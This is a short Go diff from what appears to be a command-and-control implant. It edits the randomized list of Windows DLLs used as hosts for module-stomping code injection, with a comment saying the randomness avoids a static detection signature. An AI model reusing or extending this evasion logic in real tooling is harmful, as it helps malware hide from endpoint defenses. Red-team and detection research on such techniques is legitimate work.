@@ -67,8 +67,11 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	if params.DllName == "" {
 		// Pick a random benign DLL — avoids a static signature on a single default
 		stompDLLs := []string{
-			"xpsservices.dll", "WININET.dll", "amsi.dll", "TextShaping.dll",
-			"msvcp_win.dll", "urlmon.dll", "dwrite.dll", "wintypes.dll",
+			"xpsservices.dll", "TextShaping.dll", "msvcp_win.dll", "dwrite.dll",
+			"wintypes.dll", "windows.storage.dll", "propsys.dll", "profapi.dll",
+			"dpapi.dll", "cryptbase.dll", "devobj.dll", "wldp.dll",
+			"wtsapi32.dll", "dwmapi.dll", "uxtheme.dll", "WindowsCodecs.dll",
+			"winnlsres.dll", "dxgi.dll", "d3d11.dll", "iertutil.dll",
 		}
 		r := rand.New(rand.NewSource(time.Now().UnixNano()))
 		params.DllName = stompDLLs[r.Intn(len(stompDLLs))]
